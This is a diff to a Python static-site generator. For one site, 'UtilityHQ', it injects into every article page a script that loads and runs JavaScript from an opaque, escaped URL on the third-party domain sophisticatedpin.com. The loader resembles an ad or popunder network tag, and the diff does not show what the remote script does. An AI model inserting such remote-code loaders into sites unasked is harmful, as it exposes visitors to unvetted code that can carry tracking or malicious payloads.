@@ -1626,6 +1626,21 @@ def main():
             # Generate the article page using depth=1 to update relative paths in header/footer
             art_html = generate_subpage(header, footer, art_body, depth=1)
             
+            if site == "UtilityHQ":
+                article_script = """<script>
+(function(hanmgp){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = hanmgp || {};
+s.src = "\\/\\/sophisticatedpin.com\\/b.XqVssxdUGolw0ZYhWPcf\\/Be-mq9muFZYUalckKPOT\\/cgxDNkDigGwmMqTdc_t\\/N\\/zUEr0NOKDJAZyrMgQp";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>"""
+                art_html = art_html.replace("</body>", f"{article_script}\n</body>")
+            
             art_file_path = os.path.join(articles_dir, f"{art['slug']}.html")
             write_html_file(art_file_path, art_html)
                 
